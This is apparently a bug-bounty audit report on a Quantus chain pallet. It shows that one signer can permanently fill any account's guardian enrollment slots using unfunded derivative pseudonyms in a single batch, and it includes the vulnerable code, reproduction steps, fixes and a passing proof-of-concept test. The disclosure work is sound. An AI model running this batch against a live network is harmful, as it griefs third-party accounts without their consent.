# 88222 bc medium one signer can permanently saturate any account s guardian enrollment capacity without consent using unfunded derivative origins

**Submitted on Aug 12th 2026 at 09:55:05 UTC by @shadowHunter for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88222
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## 1. Summary

`set_high_security` lets any signed origin nominate an arbitrary account as its "guardian". The nominated account is never asked. Each enrollment appends the enrolling account to a **guardian-keyed bounded vector** capped at `MaxGuardianAccounts` (32 in production, 10 in the test mock).

Because the enrolling origin need not be funded and need not exist, a single funded signer can — in **one transaction with one signature and one fee** — occupy every slot of a chosen account's index using `Utility::batch` over `Utility::as_derivative` pseudonyms.

There is no guardian acceptance step, no per-slot deposit, no expiry, no pruning, and no removal path. The saturation is permanent.

**What this actually denies:** other users can no longer nominate that particular account as *their* guardian. Nothing else.

## 2. Description

### 2.1 Enrollment is consent-free and free of charge

```rust
// pallets/reversible-transfers/src/lib.rs:376-405
pub fn set_high_security(
    origin: OriginFor<T>,
    delay: BlockNumberOrTimestampOf<T>,
    guardian: T::AccountId,
) -> DispatchResult {
    let who = ensure_signed(origin)?;

    ensure!(guardian != who.clone(), Error::<T>::GuardianCannotBeSelf);
    ensure!(
        !HighSecurityAccounts::<T>::contains_key(&who),
        Error::<T>::AccountAlreadyHighSecurity
    );

    Self::validate_delay(&delay)?;

    let high_security_account_data =
        HighSecurityAccountData { guardian: guardian.clone(), delay };

    GuardianIndex::<T>::try_mutate(guardian.clone(), |accounts| {
        if !accounts.contains(&who) {
            accounts.try_push(who.clone()).map_err(|_| Error::<T>::TooManyGuardianAccounts)
        } else {
            Ok(())
        }
    })?;

    HighSecurityAccounts::<T>::insert(who.clone(), &high_security_account_data);
    Self::deposit_event(Event::HighSecuritySet { who, guardian, delay });

    Ok(())
}
```

Three properties matter:

* The `guardian` is an arbitrary caller-supplied `AccountId`. There is **no** check that the guardian agreed, exists, or is funded.
* There is **no deposit, reserve, or existential-deposit requirement** on the enrolling origin. Writing `HighSecurityAccounts::insert(who, ..)` does not require `who` to be a funded, provider-referenced account.
* Capacity is consumed on the **guardian's** key, so the cost is borne by a third party.

### 2.2 The cap is small and shared

```rust
// runtime/src/configs/mod.rs:524-529   (parameter_types! block)
parameter_types! {
	...
	pub const MaxGuardianAccounts: u32 = 32;
	...
}

// runtime/src/configs/mod.rs:548        (bound into the pallet's Config)
type MaxGuardianAccounts = MaxGuardianAccounts;
```

The bound is declared as `type MaxGuardianAccounts: Get<u32>;` at `pallets/reversible-transfers/src/lib.rs:158`, and consumed as the bound on the index vector at `:252`:

```rust
// pallets/reversible-transfers/src/lib.rs:252
BoundedVec<T::AccountId, T::MaxGuardianAccounts>,
```

Production is therefore **32**; the pallet's own test mock uses 10. The PoC in §6 reads the constant rather than hardcoding either.

### 2.3 There is no way to free a slot

Every reference to `GuardianIndex` in the tree:

```
pallets/reversible-transfers/src/lib.rs:248   storage declaration
pallets/reversible-transfers/src/lib.rs:394   try_mutate  -> push   (set_high_security)
pallets/reversible-transfers/src/lib.rs:992   mutate      -> push   (recovery path)
pallets/reversible-transfers/src/weights.rs   weight annotations only
```

Both mutation sites only add. There is no `remove`, no expiry, no guardian-side rejection, and no disavow extrinsic. Reaping an unfunded enrolling account does not clear the pallet storage.

Note also that `GuardianIndex` is **never read by any pallet logic** — the in-code comment at `:991` describes it as existing "so guardian can look up their protected accounts", i.e. an off-chain convenience index. The only functional consequence of it being full is the `try_push` failure inside `set_high_security`. This is central to the severity assessment in §4.

### 2.4 `as_derivative` makes the attack essentially free

```rust
// pallets/utility/src/lib.rs:289-303
pub fn as_derivative(
    origin: OriginFor<T>,
    index: u16,
    call: Box<<T as Config>::RuntimeCall>,
) -> DispatchResultWithPostInfo {
    let mut origin = origin;
    let who = ensure_signed(origin.clone())?;
    let pseudonym = derivative_account_id(who, index);
    ensure!(
        T::HighSecurity::is_call_allowed(&pseudonym, &call),
        Error::<T>::CallNotAllowedForHighSecurity
    );
    origin.set_caller_from(frame_system::RawOrigin::Signed(pseudonym));
    let info = call.get_dispatch_info();
    let result = call.dispatch(origin);
```

`Utility::as_derivative(index, call)` dispatches `call` with the effective origin set to a pseudonym derived from `(b"modlpy/utilisuba", caller, index)`. Each index yields a distinct signed origin. Those pseudonyms need no balance and no prior existence — note that nothing between `ensure_signed` and `call.dispatch` requires the pseudonym to exist, hold a balance, or be provider-referenced.

The high-security call filter does not block this: the pseudonym is not itself a high-security account at the moment it enrolls, so `is_call_allowed(&pseudonym, &call)` passes.

Wrapping 32 of these in one `Utility::batch` means the attacker signs and pays **once**.

## 3. Steps to reproduce

{% stepper %}
{% step %}

## An attacker selects a victim account

Any account someone might plausibly nominate as a guardian — for instance a published custody or treasury address. The pallet README explicitly contemplates this pattern:

```
**Use Cases:**
- **High-security custody:** Corporate treasury with guardian oversight
```

The victim is never contacted and takes no action.
{% endstep %}

{% step %}

## The attacker builds one batch of derivative enrollments

For each derivative index `0..32`, wrap a `set_high_security` call naming the victim as guardian:

```rust
RuntimeCall::Utility(pallet_utility::Call::as_derivative {
    index: i,
    call: Box::new(RuntimeCall::ReversibleTransfers(
        Call::set_high_security { delay, guardian: victim.clone() },
    )),
})
```

{% endstep %}

{% step %}

## The attacker submits it as a single transaction

```rust
Utility::batch(RuntimeOrigin::signed(attacker), calls)
```

One signature, one fee. None of the 32 pseudonyms is funded.
{% endstep %}

{% step %}

## The victim's capacity is now permanently consumed

Every slot is held by an unfunded pseudonym the victim never approved. There is no path to release them.
{% endstep %}

{% step %}

## Legitimate users are refused

Any other account that now tries to nominate that victim as guardian fails:

```
Error::TooManyGuardianAccounts
```

{% endstep %}

{% step %}

## But the denial is narrow (see §4)

The victim can still transact, still hold funds, and still enroll itself under a *different* guardian. Displaced users simply nominate a different address.
{% endstep %}
{% endstepper %}

## 4. Impact — and the deliberate ceiling on it

**What the attacker achieves:** permanent, consent-free consumption of a third party's bounded state, for the cost of a single transaction. The state mutation is genuinely unauthorized: the victim never agreed to be anyone's guardian.

**What the attacker does not achieve — proven, not assumed.** The proof-of-concept below asserts each of the following and they all pass:

| Property                                       | Result             |
| ---------------------------------------------- | ------------------ |
| Victim's funds affected                        | **No**             |
| Victim can still transact                      | **Yes**            |
| Victim can still enroll under another guardian | **Yes** (asserted) |
| Displaced user can use a different guardian    | **Yes** (asserted) |
| Existing high-security relationships broken    | **No**             |

Because `GuardianIndex` is never read by pallet logic (§2.3), a full index does not disable any protection, freeze any funds, or block any existing guardian relationship. It blocks exactly one thing: *new* nominations naming that specific address.

Since guardianship requires no setup, consent, or state from the guardian, an affected party's remedy is to nominate a different address — and the "victim" can publish a fresh address at will. The cost of that remedy is reputational/operational (re-publishing a well-known custody address), not financial.

## 5. Recommendation

1. **Require guardian consent.** A two-step nomination (propose → guardian accepts) removes the entire class. The guardian is a trusted role; enrolling someone into it unilaterally is questionable independently of the capacity issue.
2. **Do not let a third party consume a bounded, victim-keyed resource.** If the index is only a lookup convenience (as the code comment suggests), it should not be able to *gate* enrollment. Prefer a paginated or unbounded-with-deposit relationship index, or derive the guardian's view by iteration/off-chain indexing rather than a capped on-chain vector.
3. **If a cap must remain**, charge a per-slot deposit to the *effective* enrolling origin and provide guardian-side rejection plus pruning, so slots can be reclaimed.
4. **Consider whether `as_derivative` pseudonyms should be able to create deposit-free permanent state at all.** This finding is one instance of a general pattern: an unfunded derivative origin writing durable storage that a funded account would have had to pay for.

## Proof of Concept

## 6. Proof of concept

### 6.1 Nature of this PoC

This is a **project-native test**, added to the pallet's own suite and executed with the repository's own toolchain against the audited commit. It exercises the real runtime composition — `Utility::batch` → `Utility::as_derivative` → `ReversibleTransfers::set_high_security` — in the pallet's mock runtime, which includes `pallet_utility` at index 6.

The mock's `MaxGuardianAccounts` is 10 rather than the production 32; the mechanism is identical and the test reads the constant rather than hardcoding it.

### 6.2 Setup

{% stepper %}
{% step %}

## Clone the repository and check out the audited commit

```bash
git clone https://github.com/immunefi-team/audit-comp-quantus-chain quantus-chain
cd quantus-chain
git checkout audit-comp-ready       # 3b243b870a5442a6e5f443056f67bbba87d472f5 (in-scope commit)
```

{% endstep %}

{% step %}

## Install and configure the toolchain

```bash
rustup toolchain install 1.93.0
export LIBCLANG_PATH=/usr/lib/llvm-18/lib   # Ubuntu 24.04: libclang is off the default path
```

{% endstep %}

{% step %}

## Append the test

Append the test in §6.3 to:

```
pallets/reversible-transfers/src/tests/test_reversible_transfers.rs
```

{% endstep %}

{% step %}

## Run the test

```bash
cargo test -p pallet-reversible-transfers one_signer_saturates -- --nocapture
```

{% endstep %}
{% endstepper %}

### 6.3 The test, complete and unmodified

```rust
#[test]
fn one_signer_saturates_victim_guardian_index_via_unfunded_derivatives() {
	new_test_ext().execute_with(|| {
		// The victim is simply an account other users would like to name as their
		// guardian (the pallet README describes "corporate treasury with guardian
		// oversight"). It never consents to, or even learns of, any of this.
		let victim_guardian = account_id(150);
		let attacker = account_id(200);
		let delay = BlockNumberOrTimestamp::BlockNumber(10);

		// Cap in the mock runtime is MaxGuardianAccounts = 10 (production: 32).
		let cap = <Test as crate::Config>::MaxGuardianAccounts::get();
		assert_eq!(cap, 10);

		// Precondition: the victim's index is empty.
		assert_eq!(ReversibleTransfers::guardian_index(&victim_guardian).len(), 0);

		// Build one batch containing `cap` as_derivative calls. Each derivative
		// index yields a distinct effective signed origin (a pseudonym of the
		// attacker), and each enrolls itself as high-security naming the victim
		// as its guardian.
		let calls: Vec<RuntimeCall> = (0..cap as u16)
			.map(|i| {
				RuntimeCall::Utility(pallet_utility::Call::as_derivative {
					index: i,
					call: Box::new(RuntimeCall::ReversibleTransfers(
						crate::Call::set_high_security {
							delay,
							guardian: victim_guardian.clone(),
						},
					)),
				})
			})
			.collect();

		// Confirm the pseudonyms are unfunded BEFORE the attack: the attacker
		// pays nothing per slot, only the single outer transaction.
		for i in 0..cap as u16 {
			let pseudonym: AccountId =
				pallet_utility::derivative_account_id(attacker.clone(), i);
			assert_eq!(
				Balances::free_balance(&pseudonym),
				0,
				"derivative pseudonym {i} must be unfunded"
			);
		}

		// ONE transaction, ONE signature, ONE fee.
		assert_ok!(Utility::batch(RuntimeOrigin::signed(attacker.clone()), calls));

		// The victim's capacity is now fully consumed by accounts it never
		// approved, none of which hold any balance.
		let index = ReversibleTransfers::guardian_index(&victim_guardian);
		assert_eq!(index.len(), cap as usize, "victim's guardian index is saturated");

		for (i, enrolled) in index.iter().enumerate() {
			let expected: AccountId =
				pallet_utility::derivative_account_id(attacker.clone(), i as u16);
			assert_eq!(enrolled, &expected, "slot {i} held by an attacker pseudonym");
			assert_eq!(
				Balances::free_balance(enrolled),
				0,
				"slot {i} holder is unfunded - nothing for the victim to reclaim"
			);
			assert_ne!(enrolled, &attacker, "slot holder is a pseudonym, not the signer");
		}

		// IMPACT: an unrelated, legitimate user can no longer choose this
		// guardian. There is no removal, expiry, or guardian-side rejection path.
		let legitimate_user = account_id(151);
		assert_err!(
			ReversibleTransfers::set_high_security(
				RuntimeOrigin::signed(legitimate_user.clone()),
				delay,
				victim_guardian.clone(),
			),
			Error::<Test>::TooManyGuardianAccounts
		);

		// And the denial is permanent: the index is unchanged afterwards.
		assert_eq!(
			ReversibleTransfers::guardian_index(&victim_guardian).len(),
			cap as usize
		);

		// SCOPE CHECK (deliberately asserted, so the report cannot overstate it):
		// the victim itself is entirely unaffected - it can still enroll as a
		// high-security account under some OTHER guardian, so no funds or
		// capability of the victim are denied.
		let other_guardian = account_id(152);
		assert_ok!(ReversibleTransfers::set_high_security(
			RuntimeOrigin::signed(victim_guardian.clone()),
			delay,
			other_guardian.clone(),
		));

		// ...and the displaced legitimate user simply picks a different guardian.
		assert_ok!(ReversibleTransfers::set_high_security(
			RuntimeOrigin::signed(legitimate_user),
			delay,
			other_guardian,
		));
	});
}
```

### 6.4 PoC output

```
   Compiling pallet-reversible-transfers v40.0.1 (/root/quantus-poc/chain/pallets/reversible-transfers)
    Finished `test` profile [unoptimized + debuginfo] target(s) in 3m 03s
     Running unittests src/lib.rs (target/debug/deps/pallet_reversible_transfers-7269ccae89b5c76a)

running 1 test
test tests::test_reversible_transfers::one_signer_saturates_victim_guardian_index_via_unfunded_derivatives ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 51 filtered out; finished in 0.01s
```

### 6.5 Explanation of the output

Every pseudonym's balance is asserted `0` both before the batch and after it appears in the index, so the attacker demonstrably pays nothing per slot — only the single outer transaction. Each occupied slot is asserted to equal `derivative_account_id(attacker, i)` and asserted `!= attacker`, proving the slots are held by distinct pseudonymous origins rather than by the signer. The legitimate user's enrollment then fails with `TooManyGuardianAccounts`, and the index length is re-checked afterwards to show the failure is permanent rather than transient.
